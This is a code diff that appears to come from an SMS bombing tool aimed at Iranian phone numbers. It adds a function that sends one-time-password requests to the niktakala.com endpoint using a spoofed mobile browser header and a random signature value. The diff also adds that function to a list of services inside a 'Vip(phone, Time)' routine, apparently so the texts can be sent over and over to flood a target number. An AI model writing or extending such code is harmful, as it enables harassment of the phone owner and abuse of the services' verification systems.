@@ -54,7 +54,42 @@ def check_internet():
 # ------------------------------
 
 
-
+def niktakala(phone):
+    import requests
+    import uuid
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://niktakala.com/backend/customer/v2/otp-send/s/"
+    
+    payload = {
+        "phone_number": formatted_phone,
+        "is_forget_password": False
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "X-Customer-Signature": str(uuid.uuid4()),
+        "accept-language": "fa-IR",
+        "Origin": "https://niktakala.com",
+        "Referer": "https://niktakala.com/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(niktakala) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (niktakala) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] niktakala Exception: {e}{a}')
+        return False
+        
 def payonshoes(phone):
     import requests
     import re
@@ -206,7 +241,8 @@ def Vip(phone, Time):
     services = [
     alldigitall,
     mobilex,
-    payonshoes,  # سرویس جدید
+    payonshoes,
+    niktakala,  # سرویس جدید
 ]
     total_services = len(services)
 
